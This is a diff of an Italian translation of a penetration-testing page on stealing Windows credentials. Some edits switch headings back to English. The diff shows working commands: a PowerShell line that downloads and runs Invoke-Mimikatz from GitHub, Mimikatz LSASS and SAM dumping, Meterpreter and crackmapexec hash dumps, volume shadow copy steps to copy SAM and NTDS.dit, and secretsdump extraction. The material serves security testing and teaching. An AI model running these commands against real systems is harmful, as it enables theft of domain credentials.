@@ -1,4 +1,4 @@
-# Furto delle Credenziali di Windows
+# Furto di Credenziali Windows
 
 {{#include ../../banners/hacktricks-training.md}}
 
@@ -24,11 +24,11 @@ IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercont
 Invoke-Mimikatz -DumpCreds #Dump creds from memory
 Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
 ```
-[**Scopri alcune possibili protezioni delle credenziali qui.**](credentials-protections.md) **Queste protezioni potrebbero impedire a Mimikatz di estrarre alcune credenziali.**
+[**Scopri alcune possibili protezioni per le credenziali qui.**](credentials-protections.md) **Queste protezioni potrebbero impedire a Mimikatz di estrarre alcune credenziali.**
 
 ## Credenziali con Meterpreter
 
-Usa il [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **che** ho creato per **cercare password e hash** all'interno della vittima.
+Utilizza il [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **che** ho creato per **cercare password e hash** all'interno della vittima.
 ```bash
 #Credentials from SAM
 post/windows/gather/smart_hashdump
@@ -74,7 +74,7 @@ Questo processo viene eseguito automaticamente con [SprayKatz](https://github.co
 Una DLL chiamata **comsvcs.dll** trovata in `C:\Windows\System32` è responsabile per **dumpare la memoria del processo** in caso di crash. Questa DLL include una **funzione** chiamata **`MiniDumpW`**, progettata per essere invocata usando `rundll32.exe`.\
 Non è rilevante utilizzare i primi due argomenti, ma il terzo è diviso in tre componenti. L'ID del processo da dumpare costituisce la prima componente, la posizione del file di dump rappresenta la seconda, e la terza componente è strettamente la parola **full**. Non esistono opzioni alternative.\
 Dopo aver analizzato queste tre componenti, la DLL viene coinvolta nella creazione del file di dump e nel trasferimento della memoria del processo specificato in questo file.\
-L'utilizzo di **comsvcs.dll** è fattibile per dumpare il processo lsass, eliminando così la necessità di caricare ed eseguire procdump. Questo metodo è descritto in dettaglio su [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).
+L'utilizzo di **comsvcs.dll** è fattibile per dumpare il processo lsass, eliminando così la necessità di caricare ed eseguire procdump. Questo metodo è descritto in dettaglio in [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).
 
 Il seguente comando è impiegato per l'esecuzione:
 ```bash
@@ -118,12 +118,12 @@ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
 ```
-### Dumpare il NTDS.dit dal DC di destinazione
+### Dump the NTDS.dit dal DC di destinazione
 ```
 cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 #~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
 ```
-### Estrai la cronologia delle password di NTDS.dit dal DC di destinazione
+### Dump the NTDS.dit password history from target DC
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
 ```
@@ -131,11 +131,11 @@ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
 ```
-## Furto di SAM e SYSTEM
+## Stealing SAM & SYSTEM
 
-Questi file dovrebbero essere **posizionati** in _C:\windows\system32\config\SAM_ e _C:\windows\system32\config\SYSTEM._ Ma **non puoi semplicemente copiarli in modo regolare** perché sono protetti.
+Questi file dovrebbero essere **localizzati** in _C:\windows\system32\config\SAM_ e _C:\windows\system32\config\SYSTEM._ Ma **non puoi semplicemente copiarli in un modo normale** perché sono protetti.
 
-### Dal Registro
+### From Registry
 
 Il modo più semplice per rubare questi file è ottenere una copia dal registro:
 ```
@@ -150,11 +150,11 @@ impacket-secretsdump -sam sam -security security -system system LOCAL
 ```
 ### Volume Shadow Copy
 
-Puoi eseguire copie di file protetti utilizzando questo servizio. Devi essere Amministratore.
+Puoi eseguire la copia di file protetti utilizzando questo servizio. Devi essere Amministratore.
 
 #### Using vssadmin
 
-Il binario vssadmin è disponibile solo nelle versioni di Windows Server.
+Il binario vssadmin è disponibile solo nelle versioni di Windows Server
 ```bash
 vssadmin create shadow /for=C:
 #Copy SAM
@@ -167,7 +167,7 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Ex
 # You can also create a symlink to the shadow copy and access it
 mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
 ```
-Ma puoi fare lo stesso con **Powershell**. Questo è un esempio di **come copiare il file SAM** (il disco rigido utilizzato è "C:" e viene salvato in C:\users\Public) ma puoi usare questo per copiare qualsiasi file protetto:
+Ma puoi fare lo stesso da **Powershell**. Questo è un esempio di **come copiare il file SAM** (il disco rigido utilizzato è "C:" e viene salvato in C:\users\Public) ma puoi usare questo per copiare qualsiasi file protetto:
 ```bash
 $service=(Get-Service -name VSS)
 if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
@@ -194,17 +194,17 @@ All'interno di questo database, vengono mantenute tre tabelle principali:
 
 Ulteriori informazioni su questo: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)
 
-Windows utilizza _Ntdsa.dll_ per interagire con quel file ed è utilizzato da _lsass.exe_. Quindi, **parte** del file **NTDS.dit** potrebbe trovarsi **all'interno della memoria di `lsass`** (puoi trovare i dati più recentemente accessi probabilmente a causa del miglioramento delle prestazioni utilizzando una **cache**).
+Windows utilizza _Ntdsa.dll_ per interagire con quel file ed è utilizzato da _lsass.exe_. Quindi, **parte** del file **NTDS.dit** potrebbe trovarsi **all'interno della memoria di `lsass`** (puoi trovare i dati più recentemente accessibili probabilmente a causa del miglioramento delle prestazioni utilizzando una **cache**).
 
 #### Decrittazione degli hash all'interno di NTDS.dit
 
 L'hash è cifrato 3 volte:
 
-1. Decrittare la Chiave di Cifratura della Password (**PEK**) utilizzando il **BOOTKEY** e **RC4**.
+1. Decrittare la Chiave di Crittografia della Password (**PEK**) utilizzando il **BOOTKEY** e **RC4**.
 2. Decrittare l'**hash** utilizzando **PEK** e **RC4**.
 3. Decrittare l'**hash** utilizzando **DES**.
 
-**PEK** ha lo **stesso valore** in **ogni controller di dominio**, ma è **cifrato** all'interno del file **NTDS.dit** utilizzando il **BOOTKEY** del **file SYSTEM del controller di dominio (è diverso tra i controller di dominio)**. Questo è il motivo per cui per ottenere le credenziali dal file NTDS.dit **hai bisogno dei file NTDS.dit e SYSTEM** (_C:\Windows\System32\config\SYSTEM_).
+**PEK** ha il **stesso valore** in **ogni controller di dominio**, ma è **cifrato** all'interno del file **NTDS.dit** utilizzando il **BOOTKEY** del **file SYSTEM del controller di dominio (è diverso tra i controller di dominio)**. Questo è il motivo per cui per ottenere le credenziali dal file NTDS.dit **hai bisogno dei file NTDS.dit e SYSTEM** (_C:\Windows\System32\config\SYSTEM_).
 
 ### Copiare NTDS.dit utilizzando Ntdsutil
 
@@ -212,7 +212,7 @@ Disponibile da Windows Server 2008.
 ```bash
 ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
 ```
-Puoi anche utilizzare il trucco della [**volume shadow copy**](./#stealing-sam-and-system) per copiare il file **ntds.dit**. Ricorda che avrai anche bisogno di una copia del file **SYSTEM** (ancora, [**dumpalo dal registro o usa il trucco della volume shadow copy**](./#stealing-sam-and-system)).
+Puoi anche utilizzare il trucco della [**volume shadow copy**](#stealing-sam-and-system) per copiare il file **ntds.dit**. Ricorda che avrai anche bisogno di una copia del file **SYSTEM** (ancora, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) trick).
 
 ### **Estrazione degli hash da NTDS.dit**
 
@@ -228,13 +228,13 @@ Per **grandi file NTDS.dit** si consiglia di estrarli utilizzando [gosecretsdump
 
 Infine, puoi anche utilizzare il **modulo metasploit**: _post/windows/gather/credentials/domain_hashdump_ o **mimikatz** `lsadump::lsa /inject`
 
-### **Estrazione degli oggetti di dominio da NTDS.dit a un database SQLite**
+### **Estrazione degli oggetti di dominio da NTDS.dit in un database SQLite**
 
 Gli oggetti NTDS possono essere estratti in un database SQLite con [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Non solo vengono estratti i segreti, ma anche gli oggetti interi e i loro attributi per ulteriori estrazioni di informazioni quando il file NTDS.dit grezzo è già stato recuperato.
 ```
 ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
 ```
-Il hive `SYSTEM` è facoltativo ma consente la decrittazione dei segreti (hash NT e LM, credenziali supplementari come password in chiaro, chiavi kerberos o di fiducia, storie delle password NT e LM). Insieme ad altre informazioni, vengono estratti i seguenti dati: account utente e macchina con i loro hash, flag UAC, timestamp per l'ultimo accesso e cambio password, descrizione degli account, nomi, UPN, SPN, gruppi e appartenenze ricorsive, albero delle unità organizzative e appartenenza, domini fidati con tipo di fiducia, direzione e attributi...
+Il hive `SYSTEM` è facoltativo ma consente la decrittazione dei segreti (hash NT e LM, credenziali supplementari come password in chiaro, chiavi kerberos o di trust, storie delle password NT e LM). Insieme ad altre informazioni, vengono estratti i seguenti dati: account utente e macchina con i loro hash, flag UAC, timestamp per l'ultimo accesso e cambio password, descrizione degli account, nomi, UPN, SPN, gruppi e appartenenze ricorsive, albero delle unità organizzative e appartenenza, domini fidati con tipo di trust, direzione e attributi...
 
 ## Lazagne
 
